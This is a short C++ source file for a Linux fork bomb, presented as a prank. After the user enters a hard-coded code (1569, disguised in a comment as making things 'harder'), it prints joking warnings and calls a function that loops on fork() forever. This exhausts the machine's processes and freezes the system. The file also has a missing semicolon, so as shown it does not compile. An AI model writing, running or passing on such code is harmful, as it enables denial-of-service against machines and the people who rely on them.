#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <thread>

void bomb()
{
	while (true)
	{
		fork();
    printf("SUS")
	}
}

int main(int argc, char *argv[])
{
    printf("cool\n");
    int acode = (7 + 2 + 60 + 1000 + 500); //1569 - makes stuff harder for people who dont know the code :)
	  int code;
	  std::cin >> code;
	  if (code == acode)
	  {
        printf("Forkbomb - Linux Version \n");
        printf("COMPUTER WILL GET VERY SLOW\n");
        printf("RUN WHILE YOU CAN\n");
        printf("CPU FAN MIGHT GO VROOM\n");
		    printf("Bombing the computer...\n");
		    bomb();
    }
    return 1;
}
